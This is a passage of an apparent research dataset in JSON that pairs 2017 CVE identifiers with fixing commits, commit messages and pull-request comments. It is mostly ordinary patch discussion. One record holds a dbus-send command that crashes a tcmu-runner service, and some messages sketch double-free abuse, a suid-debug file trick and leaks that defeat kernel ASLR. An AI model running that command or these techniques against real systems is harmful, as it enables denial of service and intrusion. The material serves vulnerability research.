            "commit_msg": "Walk the entire DefaultRoot path, checking for symlinks of any component,\nwhen AllowChrootSymlinks is disabled.",
            "commit_msg_words": 15,
            "other_info": "Walk the entire DefaultRoot path, checking for symlinks of any compon\u2026 \n[![Coverage Status](https://coveralls.io/builds/10443926/badge)](https://coveralls.io/builds/10443926)\n\nCoverage remained the same at 81.305% when pulling **349addc3be4fcdad9bd4ec01ad1ccd916c898ed8 on auth-symlinks-anywhere-in-chroot** into **b0759ffbce9253045cbe53f552acfbdcf74af784 on master**.",
            "pr_title_words": 11,
            "comments_words": 17,
            "total_other_info_words": 28
        },
        {
            "cve-id": "CVE-2017-15033",
            "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/ef8f40689ac452398026c07da41656a7c87e4683",
            "commit_msg": "fix multiple memory leak in ReadYUVImage",
            "commit_msg_words": 6,
            "other_info": "fix multiple memory leak in ReadYUVImage Thanks for this pull request could you also make one fro the IM6 branch? @dlemstra i will test im6 later This was assigned CVE-2017-15033.",
            "pr_title_words": 6,
            "comments_words": 24,
            "total_other_info_words": 30
        },
        {
            "cve-id": "CVE-2017-5581",
            "commit_url": "https://github.com/TigerVNC/tigervnc/commit/18c020124ff1b2441f714da2017f63dba50720ba",
            "commit_msg": "Fix buffer overflow in ModifiablePixelBuffer::fillRect.\n\nIt can be triggered by RRE message with subrectangle out of framebuffer\nboundaries. It may prevent the same kind of issue caused by evil message\nfrom another encoding too.",
            "commit_msg_words": 34,
            "other_info": "Fix buffer overflow in ModifiablePixelBuffer::fillRect. A good start. We should probably add more checks at other layers as well though. If nothing else to get better error messages.\r\n\r\nAnd I don't see why we don't just completely fail things at this point, as these are invalid requests. I'll do some follow up commits.\r\n\r\nThanks for the report and patch. This has been assigned [CVE-2017-5581](http://www.openwall.com/lists/oss-security/2017/01/25/6)",
            "pr_title_words": 5,
            "comments_words": 59,
            "total_other_info_words": 64
        },
        {
            "cve-id": "CVE-2017-17479",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/0bc90e4062a5f9258c91eca018c019b179066c62",
            "commit_msg": "jp3d/jpwl convert: fix write stack buffer overflow\n\nMissing buffer length formatter in fscanf call might lead to write\nstack buffer overflow.\n\nfixes #1044 (CVE-2017-17480)",
            "commit_msg_words": 24,
            "other_info": "jp3d/jpwl convert: fix write stack buffer overflow FTR, I have added a second fix addressing #1152. A few comments:\r\n\r\n* The first loop does not seem to be affected (line 2101), there are a few checks earlier during decoding forbidding the first tile to have zero size (not sure this is the expected behavior, but anyways). We might want to add a check there as well to be defensive, but it is not necessary to fix this issue.\r\n\r\n* There might be other places in the code affected by this issue, but this patch does not address them.",
            "pr_title_words": 7,
            "comments_words": 91,
            "total_other_info_words": 98
        },
        {
            "cve-id": "CVE-2017-20180",
            "commit_url": "https://github.com/Zerocoin/libzerocoin/commit/ce103a09ec079d0a0ed95475992348bed6e860de",
            "commit_msg": "Patch serial # exploit.\n\nThe serial # range needs to be checked or else the serial number is able to be incremented to a value that will create a valid proof, thus allowing multiple spends of a single mint.",
            "commit_msg_words": 39,
            "other_info": "Patch serial numbers",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2017-15908",
            "commit_url": "https://github.com/systemd/systemd/commit/9f939335a07085aa9a9663efd1dca06ef6405d62",
            "commit_msg": "resolved: fix loop on packets with pseudo dns types\n\nReported by Karim Hossen & Thomas Imbert from Sogeti ESEC R&D.\n\nhttps://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1725351",
            "commit_msg_words": 21,
            "other_info": "resolved: fix loop on packets with pseudo dns types lgtm `xenial-i386` seems to be just waiting in the build queue. When merging, please add CVE-2017-15908 to the commit log, for good cross-referencing.",
            "pr_title_words": 9,
            "comments_words": 23,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-7393",
            "commit_url": "https://github.com/TigerVNC/tigervnc/commit/f3afa24da144409a3c3a0e35913112583d987671",
            "commit_msg": "Prevent double free by crafted fences.\n\nIf client sent fence with some data, followed by fence with no data (length 0), the original fence data were freed, but the pointer kept pointing at them. Sending one more fence would attempt to free them again.",
            "commit_msg_words": 44,
            "other_info": "Prevent double free by crafted fences. This has been assigned CVE-2017-7393",
            "pr_title_words": 6,
            "comments_words": 5,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2017-2582",
            "commit_url": "https://github.com/keycloak/keycloak/commit/0cb5ba0f6e83162d221681f47b470c3042eef237",
            "commit_msg": "KEYCLOAK-4160",
            "commit_msg_words": 1,
            "other_info": "KEYCLOAK-4160",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2017-5495",
            "commit_url": "https://github.com/FRRouting/frr/commit/2af38873d89e20bd039255418366c1601aa99e64",
            "commit_msg": "lib: limit size of vty buffer to 4096 bytes\n\nThis removes the automatic resizing of the vty input buffer and places a\nhard size cap of 4096 bytes. It also fixes a potentially unsafe strcpy.\n\nSigned-off-by: Quentin Young <qlyoung@cumulusnetworks.com>",
            "commit_msg_words": 39,
            "other_info": "lib: limit size of vty buffer to 4096 bytes # Continous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\n__CI System Testrun URL: https://ci1.netdef.org/browse/FRR-FRRPULLREQ-34/__\n\nThis is a comment from an EXPERIMENTAL automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n This is [CVE-2017-5495](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5495)",
            "pr_title_words": 9,
            "comments_words": 56,
            "total_other_info_words": 65
        },
        {
            "cve-id": "CVE-2017-11521",
            "commit_url": "https://github.com/resiprocate/resiprocate/commit/4b8ffa5afd3291a2701f8d39c31ada443f79a5c8",
            "commit_msg": "resip/stack: SdpContents: Avoid out-of-memory condition (CVE-2017-11521)\n\nAdding too many media connections may lead to memory\nexhaustion.",
            "commit_msg_words": 16,
            "other_info": "resip/stack: SdpContents: Avoid out-of-memory condition",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2017-14136",
            "commit_url": "https://github.com/opencv/opencv/commit/aacae2065744adb05e858d327198c7bbe7f452b0",
            "commit_msg": "imgcodesc: fix code problems with integer overflow / address arithmetic / UB",
            "commit_msg_words": 12,
            "other_info": "imgcodecs: fix code problems with integer overflow / address arithmetic / UB :+1: Hi,\r\nthis is related to CVE-2017-14136 and merged to mater only.\r\nDoes it need to be backported to 2.4? ( #9376 was backported as #9383 )",
            "pr_title_words": 12,
            "comments_words": 27,
            "total_other_info_words": 39
        },
        {
            "cve-id": "CVE-2017-15364",
            "commit_url": "https://github.com/evan/ccsv/commit/24e0b9b94c44a15b23475e821366239d53764dbd",
            "commit_msg": "proposed non elegant fix for double free vulnerability",
            "commit_msg_words": 8,
            "other_info": "Proposed fix for double free vulnerability",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2017-15089",
            "commit_url": "https://github.com/infinispan/infinispan/commit/69be66141eee7abb1c47d46f0a6b74b079709f4b",
            "commit_msg": "ISPN-8624 Custom marshaller implementors should verify class names\n\n* Add documentation entry to make sure any custom marshaller\n  implementations implement white class name verification.",
            "commit_msg_words": 24,
            "other_info": "ISPN-8624 Extend unmarshalling white list to GenericJBossMarshaller @galderz There are multiple test failures related to the hotrod client Fixed compilation and failing tests. Merged, thanks @tristantarrant Can this MR solve the CVE issue\"CVE-2017-15089\", and if solved, then what's the fixed version? Infinispan 9.2.0.Final? Thanks!\r\nThe CVE link:https://nvd.nist.gov/vuln/detail/CVE-2017-15089#vulnDescriptionTitle 9.2.0.Final and 9.1.7.Final @tristantarrant Thanks!",
            "pr_title_words": 7,
            "comments_words": 45,
            "total_other_info_words": 52
        },
        {
            "cve-id": "CVE-2017-1000450",
            "commit_url": "https://github.com/opencv/opencv/commit/c58152d94ba878b2d7d76bcac59146312199b9eb",
            "commit_msg": "Fix out of bounds write",
            "commit_msg_words": 5,
            "other_info": "Fix out of bounds write By the way, do we need to add the same check in other places, for example at [line 396](https://github.com/opencv/opencv/pull/9726/files#diff-236c3294512b9353649b64ad8385e984R396)? :+1:  @savuor I haven't dug too deep into these functions. It doesn't look like `y` is used for anything meaningful in the `FillColorRow` functions or the if blocks they are in. There might be something bad in these functions because they don't really use the `y` variable. Checking that `y >= m_height` after every point it is incremented might be enough to stop a crash in the `FillColorRow` functions. I will audit these though with this patch in place and see if anything turns up.\r\n\r\nI would merge this first though, and I'll submit another patch if something turns up. CVE-2017-1000450",
            "pr_title_words": 5,
            "comments_words": 120,
            "total_other_info_words": 125
        },
        {
            "cve-id": "CVE-2017-9454",
            "commit_url": "https://github.com/resiprocate/resiprocate/commit/d67a9ca6fd06ca65d23e313bdbad1ef4dd3aa0df",
            "commit_msg": "ares: Prevent buffer overlow in ares_parse_a_reply (CVE-2017-9454)\n\nThis buffer overflow is in the embedded copy of ares that will be\nused unless the external alternative c-ares is used by specifying\nthe configure argument --with-c-ares.\n\nIt has been found with LibFuzzer from the LLVM project.",
            "commit_msg_words": 44,
            "other_info": "Fix ares problems Thanks Gregor!",
            "pr_title_words": 3,
            "comments_words": 2,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2017-1000200",
            "commit_url": "https://github.com/open-iscsi/tcmu-runner/commit/bb80e9c7a798f035768260ebdadffb6eb0786178",
            "commit_msg": "only allow dynamic UnregisterHandler for external handlers, thereby fixing DoS\n\nTrying to unregister an internal handler ended up in a SEGFAULT, because\nthe tcmur_handler->opaque was NULL. Way to reproduce:\n\ndbus-send --system --print-reply --dest=org.kernel.TCMUService1 /org/kernel/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.UnregisterHandler string:qcow\n\nwe use a newly introduced boolean in struct tcmur_handler for keeping\ntrack of external handlers. As suggested by mikechristie adjusting the\npublic data structure is acceptable.",
            "commit_msg_words": 62,
            "other_info": "Rebased: Various security and functionality related bugfixes (multiple DoS, memory leaks) Hi @mgerstner ,\r\nI was discussing the criticality of this issue with @sidhax and we are wondering if you have raised any CVE for the security issue on this ? Actually that was something I wanted to ask you about, too. I have not requested any CVE yet. \r\n\r\nI think commit 8cf8208775022301adaa59c240bb7f93742d1329 justifies a CVE, because of the information leak as described in issue #194.\r\n\r\nThe memory leaks and denial of service issues from commits\r\n\r\n7a78eda52d973d3edc06fea84ad874678d6055f0\r\nbb80e9c7a798f035768260ebdadffb6eb0786178\r\ne2d953050766ac538615a811c64b34358614edce\r\n\r\nare minor issues, but mostly they're also assigned CVEs for easier tracking by other distros.\r\n\r\nDo you have a workflow for this? I can request the CVEs for you if you like. @mgerstner can you please file request for CVEs ? Also for https://github.com/open-iscsi/tcmu-runner/commit/8cf8208775022301adaa59c240bb7f93742d1329 I think its more of secure coding. It cannot read contents of file as per my understanding. Dbus output only returns true or false, would you still consider this a security flaw ? Also other 3 commits are for local dos so attacker would already need shell to to trigger local dos. @sidhax: Okay I will request CVEs and report back when they're assigned.\r\n\r\nNo you can't read file content but it still gives you some information that would otherwise not be available like what files are existing in /root. There could be situations, combined with other security issues in other software, when this can lead to exploits.\r\n\r\nWorse is the example code in file_example_c, by the way. It allows to create arbitrary empty files for a short time, making it possible for example to create /etc/suid-debug just in time for some suid binary to run in debug mode. There could be other possibilities like creating things via /sys. I hope nobody used this example code for their own handlers.\r\n\r\nThe DoS are only local yes. But a non-root user can DoS a service running as root. Or leak memory.\r\n\r\nNothing critical altogether but let's give users of tcmu-runner a chance to recognize these issues and backport them if they deem it necessary. @mgerstner Make sense to me, Thanks :-) @mgerstner sorry! you may have to drop https://github.com/open-iscsi/tcmu-runner/pull/200/commits/b0beac3a490092c7c202dc4fb0bbaa7af09bb10d as https://github.com/open-iscsi/tcmu-runner/pull/199 is closed Okay I've rebased, dropped the conflicting commit > @mikechristie\r\nShould we wait till open-iscsi/targetcli-fb#87 gets merged and available ?\r\n\r\nI don't know.\r\n\r\nI have been debating that. It will also require users to upgrade to the 4.13 kernel and that is around rc1 stage right now.\r\n\r\nThe thing is that with the removal of the check_config code, I think we can just delete all the dbus code since it does nothing now as far as I can tell. For this we would also need to sync up with targetcli releases. It's code to connect to dbus will fail during device setup, so existing setups would fail if they updated runner, but not targetcli.\r\n\r\nMaybe, we could say for the next runner release you must use 4.13 and targetcli-fb XYZ? Here is one additional fix up we will need for these patches. When we would exit() from the signal handler, the code after the g_main_run would not get run normally. With the patch to use g_main_quit, we cannot use the logger after the signal handler has killed the logger threads. It also moves the cancel_log_thread call to after the config cancel incase the config shutdown code tries to log something.\r\n\r\n[0001-runner-fix-log-use-during-shutdown.txt](https://github.com/open-iscsi/tcmu-runner/files/1163654/0001-runner-fix-log-use-during-shutdown.txt) One update:\r\n\r\nI have emailed the targetcli maintainer about trying to coordinate check_config and dbus removal. When that is done I will merge these patches. @mikechristie: do you want me to add the logging patch to this pull request? I can add an additional commit but want to avoid another rebase, because I've already used the commit URLs in CVE requests and bugzilla tickets. @mikechristie: we could also think about cancelling the log thread not in the signal handler but at the end of the main() function. This would make for a smaller patch and logging could be used without worries about shutdown situations. No, you do not need to carry the patch. I will merge it when I merge you PR.\r\n\r\nAs far as doing the canceling in the sig handler or end of the main function, it does not matter to me where it goes. Is there any place where it is more common? It would be best to do both the config and log cancel calls in the same place, just so it is consistent. Here's the plan.\r\n\r\n1. I am going to merge this set as is even though some patches will not be necessary when the dbus code is removed.\r\n2. Andy (targetcli/rtslib -fb maintainer) will help us coordinate a release.\r\n3. In another PR we will remove the dbus code. FTR:\r\n\r\n- CVE requests are still pending\r\n- I've posted a summary on the oss-security mailing list: http://www.openwall.com/lists/oss-security/2017/07/24/1 I've got most of the CVEs via [DWF](https://github.com/distributedweaknessfiling/) now:\r\n\r\n- CVE-2017-1000198 for DoS in the GLFS handler which was removed in commit 61bd03e600d2abf309173e9186f4d465bb1b7157\r\n- CVE-2017-1000199 for information leak in qcow handler as reported in issue #194\r\n- CVE-2017-1000200 for DoS fixed in commit bb80e9c7a798f035768260ebdadffb6eb0786178\r\n- CVE-2017-1000201 for DoS fixed in commit e2d953050766ac538615a811c64b34358614edce\r\n\r\na CVE for the memory leaks fixed in commit 7a78eda52d973d3edc06fea84ad874678d6055f0 is still pending.",
            "pr_title_words": 11,
            "comments_words": 863,
            "total_other_info_words": 874
        },
        {
            "cve-id": "CVE-2017-11575",
            "commit_url": "https://github.com/fontforge/fontforge/commit/4de0c58a01e5e30610c200e9aea98bc7db12c7ac",
            "commit_msg": "Fix out of bounds read condition and buffer overflow condition\n\n* parsettf.c: Reading past the end of the fontnames array\n* psread.c: Reading more data than is available in type1\n* tottf.c: Use snprintf instead of sprintf\n\nCloses #3096",
            "commit_msg_words": 39,
            "other_info": "Fix a few cves Just in time. I'm cutting a release tomorrow. I'll review as soon as I get a chance.\r\n I made one inline comment/query. It otherwise looks fine.\r\n All good.",
            "pr_title_words": 4,
            "comments_words": 28,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-13695",
            "commit_url": "https://github.com/acpica/acpica/commit/37f2c716f2c6ab14c3ba557a539c3ee3224931b5",
            "commit_msg": "acpi: acpica: fix acpi operand cache leak in nseval.c\n\nI found an ACPI cache leak in ACPI early termination and boot continuing case.\n\nWhen early termination occurs due to malicious ACPI table, Linux kernel\nterminates ACPI function and continues to boot process. While kernel terminates\nACPI function, kmem_cache_destroy() reports Acpi-Operand cache leak.\n\nBoot log of ACPI operand cache leak is as follows:\n>[    0.464168] ACPI: Added _OSI(Module Device)\n>[    0.467022] ACPI: Added _OSI(Processor Device)\n>[    0.469376] ACPI: Added _OSI(3.0 _SCP Extensions)\n>[    0.471647] ACPI: Added _OSI(Processor Aggregator Device)\n>[    0.477997] ACPI Error: Null stack entry at ffff880215c0aad8 (20170303/exresop-174)\n>[    0.482706] ACPI Exception: AE_AML_INTERNAL, While resolving operands for [OpcodeName unavailable] (20170303/dswexec-461)\n>[    0.487503] ACPI Error: Method parse/execution failed [\\DBG] (Node ffff88021710ab40), AE_AML_INTERNAL (20170303/psparse-543)\n>[    0.492136] ACPI Error: Method parse/execution failed [\\_SB._INI] (Node ffff88021710a618), AE_AML_INTERNAL (20170303/psparse-543)\n>[    0.497683] ACPI: Interpreter enabled\n>[    0.499385] ACPI: (supports S0)\n>[    0.501151] ACPI: Using IOAPIC for interrupt routing\n>[    0.503342] ACPI Error: Null stack entry at ffff880215c0aad8 (20170303/exresop-174)\n>[    0.506522] ACPI Exception: AE_AML_INTERNAL, While resolving operands for [OpcodeName unavailable] (20170303/dswexec-461)\n>[    0.510463] ACPI Error: Method parse/execution failed [\\DBG] (Node ffff88021710ab40), AE_AML_INTERNAL (20170303/psparse-543)\n>[    0.514477] ACPI Error: Method parse/execution failed [\\_PIC] (Node ffff88021710ab18), AE_AML_INTERNAL (20170303/psparse-543)\n>[    0.518867] ACPI Exception: AE_AML_INTERNAL, Evaluating _PIC (20170303/bus-991)\n>[    0.522384] kmem_cache_destroy Acpi-Operand: Slab cache still has objects\n>[    0.524597] CPU: 1 PID: 1 Comm: swapper/0 Not tainted 4.12.0-rc5 #26\n>[    0.526795] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006\n>[    0.529668] Call Trace:\n>[    0.530811]  ? dump_stack+0x5c/0x81\n>[    0.532240]  ? kmem_cache_destroy+0x1aa/0x1c0\n>[    0.533905]  ? acpi_os_delete_cache+0xa/0x10\n>[    0.535497]  ? acpi_ut_delete_caches+0x3f/0x7b\n>[    0.537237]  ? acpi_terminate+0xa/0x14\n>[    0.538701]  ? acpi_init+0x2af/0x34f\n>[    0.540008]  ? acpi_sleep_proc_init+0x27/0x27\n>[    0.541593]  ? do_one_initcall+0x4e/0x1a0\n>[    0.543008]  ? kernel_init_freeable+0x19e/0x21f\n>[    0.546202]  ? rest_init+0x80/0x80\n>[    0.547513]  ? kernel_init+0xa/0x100\n>[    0.548817]  ? ret_from_fork+0x25/0x30\n>[    0.550587] vgaarb: loaded\n>[    0.551716] EDAC MC: Ver: 3.0.0\n>[    0.553744] PCI: Probing PCI hardware\n>[    0.555038] PCI host bridge to bus 0000:00\n> ... Continue to boot and log is omitted ...\n\nI analyzed this memory leak in detail and found AcpiNsEvaluate() function\nonly removes Info->ReturnObject in AE_CTRL_RETURN_VALUE case. But, when errors\noccur, the status value is not AE_CTRL_RETURN_VALUE, and Info->ReturnObject is\nalso not null. Therefore, this causes acpi operand memory leak.\n\nThis cache leak causes a security threat because an old kernel (<= 4.9) shows\nmemory locations of kernel functions in stack dump. Some malicious users\ncould use this information to neutralize kernel ASLR.\n\nI made a patch to fix ACPI operand cache leak.\n\nSigned-off-by: Seunghun Han <kkamagui@gmail.com>",
            "commit_msg_words": 410,
            "other_info": "acpi: acpica: fix acpi operand cache leak in nseval.c We are still looking at these, and could use some help reproducing them.\r\n I am afraid that there is nothing new.\r\n\r\nI have been solving a critical security issue in BIOS/UEFI firmware since last December.\r\n\r\nIt seems that it is worth to be merged and after solving BIOS/UEFI issue, I will keep monitoring it.",
            "pr_title_words": 9,
            "comments_words": 54,
            "total_other_info_words": 63
        },
        {
            "cve-id": "CVE-2017-11472",
            "commit_url": "https://github.com/acpica/acpica/commit/a23325b2e583556eae88ed3f764e457786bf4df6",
            "commit_msg": "Namespace: fix operand cache leak\n\nI found some ACPI operand cache leaks in ACPI early abort cases.\n\nBoot log of ACPI operand cache leak is as follows:\n>[    0.174332] ACPI: Added _OSI(Module Device)\n>[    0.175504] ACPI: Added _OSI(Processor Device)\n>[    0.176010] ACPI: Added _OSI(3.0 _SCP Extensions)\n>[    0.177032] ACPI: Added _OSI(Processor Aggregator Device)\n>[    0.178284] ACPI: SCI (IRQ16705) allocation failed\n>[    0.179352] ACPI Exception: AE_NOT_ACQUIRED, Unable to install\nSystem Control Interrupt handler (20160930/evevent-131)\n>[    0.180008] ACPI: Unable to start the ACPI Interpreter\n>[    0.181125] ACPI Error: Could not remove SCI handler\n(20160930/evmisc-281)\n>[    0.184068] kmem_cache_destroy Acpi-Operand: Slab cache still has\nobjects\n>[    0.185358] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.10.0-rc3 #2\n>[    0.186820] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS\nVirtualBox 12/01/2006\n>[    0.188000] Call Trace:\n>[    0.188000]  ? dump_stack+0x5c/0x7d\n>[    0.188000]  ? kmem_cache_destroy+0x224/0x230\n>[    0.188000]  ? acpi_sleep_proc_init+0x22/0x22\n>[    0.188000]  ? acpi_os_delete_cache+0xa/0xd\n>[    0.188000]  ? acpi_ut_delete_caches+0x3f/0x7b\n>[    0.188000]  ? acpi_terminate+0x5/0xf\n>[    0.188000]  ? acpi_init+0x288/0x32e\n>[    0.188000]  ? __class_create+0x4c/0x80\n>[    0.188000]  ? video_setup+0x7a/0x7a\n>[    0.188000]  ? do_one_initcall+0x4e/0x1b0\n>[    0.188000]  ? kernel_init_freeable+0x194/0x21a\n>[    0.188000]  ? rest_init+0x80/0x80\n>[    0.188000]  ? kernel_init+0xa/0x100\n>[    0.188000]  ? ret_from_fork+0x25/0x30\n\nWhen early abort is occurred due to invalid ACPI information, Linux kernel\nterminates ACPI by calling AcpiTerminate() function. The function calls\nAcpiNsTerminate() function to delete namespace data and ACPI operand cache\n(AcpiGbl_ModuleCodeList).\n\nBut the deletion code in AcpiNsTerminate() function is wrapped in\nACPI_EXEC_APP definition, therefore the code is only executed when the\ndefinition exists. If the define doesn't exist, ACPI operand cache\n(AcpiGbl_ModuleCodeList) is leaked, and stack dump is shown in kernel log.\n\nThis causes a security threat because the old kernel (<= 4.9) shows memory\nlocations of kernel functions in stack dump, therefore kernel ASLR can be\nneutralized.\n\nTo fix ACPI operand leak for enhancing security, I made a patch which\nremoves the ACPI_EXEC_APP define in AcpiNsTerminate() function for\nexecuting the deletion code unconditionally.\n\nSigned-off-by: Seunghun Han <kkamagui@gmail.com>\nSigned-off-by: Lv Zheng <lv.zheng@intel.com>",
            "commit_msg_words": 316,
            "other_info": "Acpica ifdef",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2017-0196",
            "commit_url": "https://github.com/chakra-core/ChakraCore/commit/065b7978c40ded35c356ced6cd922a40156c9c46",
            "commit_msg": "[CVE-2017-0196] Fixing an heap overread during slice.\n\nThe MissingItem check is happening on the array in a loop. It is possible that we get called into script and that mutates the array. So the Array's head is newly created with length.\nHowever the loop is still performing over the old length.\nFixed this by checking the length In IsMissingItem function.\nAdded a unittest.",
            "commit_msg_words": 63,
            "other_info": "17-03 ChakraCore servicing release @Cellule @Penguinwizzard @agarwal-sandeep @tcare @pleath @akroshg @aneeshdk @suwc @leirocks FYI My 2 commits look good. LGTM. LGTM LGTM LGTM LGTM",
            "pr_title_words": 4,
            "comments_words": 20,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2017-9989",
            "commit_url": "https://github.com/libming/libming/commit/1a1d2704cb19f2d3299f042bb3a4783c960b0a9a",
            "commit_msg": "Change type of size variable in readBytes\n\nsize should have type unsigned long instead of int in order\nto avoid overflows and lossy casts when passing U30 integers.\n\nThis commit fixes CVE-2017-9989 (fixes #86).",
            "commit_msg_words": 34,
            "other_info": "Fix various flaws in readBytes (overflow, possible null pointer dereference) I still catch a memory allocation error at line 240 with asan. This is because of the large allocation request. I don't know how to avoid this.",
            "pr_title_words": 10,
            "comments_words": 27,
            "total_other_info_words": 37
        },
        {
            "cve-id": "CVE-2017-13099",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/fd455d5a5e9fef24c208e7ac7d3a4bc58834cbf1",
            "commit_msg": "Fix for handling of static RSA PKCS formatting failures so they are indistinguishable from from correctly formatted RSA blocks (per RFC5246 section 7.4.7.1). Adjusted the static RSA preMasterSecret RNG creation for consistency in client case. Removed obsolete `PMS_VERSION_ERROR`.",
            "commit_msg_words": 38,
            "other_info": "Fix for handling of static RSA padding failures",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2017-11734",
            "commit_url": "https://github.com/libming/libming/commit/1f5976337d2cf02d5f709cb1d0dac479976e5f94",
            "commit_msg": "Fix heap buffer overflow in decompileCALLFUNCTION\n\nMake sure that n > 0 before checking for the previous action in the\nactions array, otherwise an overflow may occur.\n\nThis commit fixes CVE-2017-11734 (fixes #83).",
            "commit_msg_words": 33,
            "other_info": "Fix heap buffer overflow in decompileCALLFUNCTION Hum, something is wrong: first condition should be `n >= 1` and not `n > 1`. Pull request updated.",
            "pr_title_words": 6,
            "comments_words": 19,
            "total_other_info_words": 25
        },
        {
            "cve-id": "CVE-2017-6308",
            "commit_url": "https://github.com/verdammelt/tnef/commit/c5044689e50039635e7700fe2472fd632ac77176",
            "commit_msg": "Fix integer overflows and harden memory allocator.",
            "commit_msg_words": 7,
            "other_info": "Release 1.4.13",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2017-18078",
            "commit_url": "https://github.com/systemd/systemd/commit/5579f85663d10269e7ac7464be6548c99cea4ada",
            "commit_msg": "tmpfiles: refuse to chown()/chmod() files which are hardlinked, unless protected_hardlinks sysctl is on\n\nLet's add some extra safety.\n\nFixes: #7736",
            "commit_msg_words": 20,
            "other_info": "a number of tmpfiles fixes This also fixes #7975. Force pushed a new version that fixes what @yuwata pointed out. I also adding a tiny addition to UIDS-GIDS.md on top. And I referenced the new #7975 issue that popped up. lgtm.",
            "pr_title_words": 5,
            "comments_words": 36,
            "total_other_info_words": 41
        },
        {
            "cve-id": "CVE-2017-11733",
            "commit_url": "https://github.com/libming/libming/commit/eda5a20206862a11805303cdd125566c9f9f9103",
            "commit_msg": "Fix null-pointer dereference issue in stackswap.\n\nAvoid processing stackswap when stack only contains one element. In this\ncase, print a warning if debug mode is enabled, and return cleanly.\n\nThis commit fixes CVE-2017-11733 (fixes #78).",
            "commit_msg_words": 35,
            "other_info": "Fix various issues related to CVE-2017-11733. This PR now addresses various issues regarding `readSInt16`, `readUInt16` and `readSInt32`.\r\n\r\nThese issues haven't been reported as such, but I suspect them to be part of those still open. I also suggest to un-define `DEBUGSTACK`. You'll find more detailed explanations in the commit message.\r\n\r\nThese three commit are addressing three (more or less) separate issues. If you want, I can squash them into a single one, but I wouldn't recommend it.\r\n\r\nCVE-2017-11733 seems to be completely fixed now. Should that \"stackswap: can't swap\" warning really be protected by\nDEBUG ?\n\nAnyway, I merged it as-is, thank you!",
            "pr_title_words": 6,
            "comments_words": 97,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2017-8289",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/eef90c06fb36ed08f82b1176bf6d1c9c8615be86",
            "commit_msg": "ipv6_addr: provide fix for off-by-x error",
            "commit_msg_words": 6,
            "other_info": "ipv6_addr: provide fix for off-by-x error Backport provided at #6962.",
            "pr_title_words": 6,
            "comments_words": 4,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2017-7875",
            "commit_url": "https://github.com/derf/feh/commit/f7a547b7ef8fc8ebdeaa4c28515c9d72e592fb6d",
            "commit_msg": "Fix double-free/OOB-write while receiving IPC data\n\nIf a malicious client pretends to be the E17 window manager, it is\npossible to trigger an out of boundary heap write while receiving an\nIPC message.\n\nThe length of the already received message is stored in an unsigned\nshort, which overflows after receiving 64 KB of data. It's comparably\nsmall amount of data and therefore achievable for an attacker.\n\nWhen len overflows, realloc() will either be called with a small value\nand therefore chars will be appended out of bounds, or len + 1 will be\nexactly 0, in which case realloc() behaves like free(). This could be\nabused for a later double-free attack as it's even possible to overwrite\nthe free information -- but this depends on the malloc implementation.\n\nSigned-off-by: Tobias Stoeckmann <tobias@stoeckmann.org>",
            "commit_msg_words": 132,
            "other_info": "Fix double-free/OOB-write while receiving IPC data",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2017-7555",
            "commit_url": "https://github.com/hercules-team/augeas/commit/4cca923b732990bec0c699b2e69911c2221b2498",
            "commit_msg": "* src/pathx.c (parse_name): correctly handle trailing whitespace in names\n\nWhen a name ended in whitespace, we incorrectly assumed it was always ok to\ntrim that whitespace. That is not true if that whitespace is escaped,\ni.e. if the path expression is something like '/x\\ '. In that case, the\nname really needs to be literally 'x ', i.e., we can not trim that\nwhitespace.\n\nThe incorrect behavior led to turning '/x\\ ' first into 'x\\' and then,\nbecause we assume that '\\' is always followed by a character inside the\nstring, when we removed the escaping '\\', we would read beyond the end of\nthe intermediate string result; if we were lucky, that would lead to a\ncrash, otherwise we'd continue with junk.\n\nWe now make sure that escaped whitespace at the end of a string does not\nget stripped, avoiding all these headaches.\n\nFixes RHBZ https://bugzilla.redhat.com/show_bug.cgi?id=1475621",
            "commit_msg_words": 147,
            "other_info": "* src/pathx.c (parse_name): correctly handle trailing whitespace in n\u2026 This is CVE-2017-7555.",
            "pr_title_words": 9,
            "comments_words": 3,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2017-1000207",
            "commit_url": "https://github.com/swagger-api/swagger-parser/commit/4c6584306b40de9b2dfa9065c3a438cd918534af",
            "commit_msg": "parser change.",
            "commit_msg_words": 2,
            "other_info": "parser change. Many thanks!  Tests look good.",
            "pr_title_words": 2,
            "comments_words": 5,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2017-12424",
            "commit_url": "https://github.com/shadow-maint/shadow/commit/954e3d2e7113e9ac06632aee3c69b8d818cc8952",
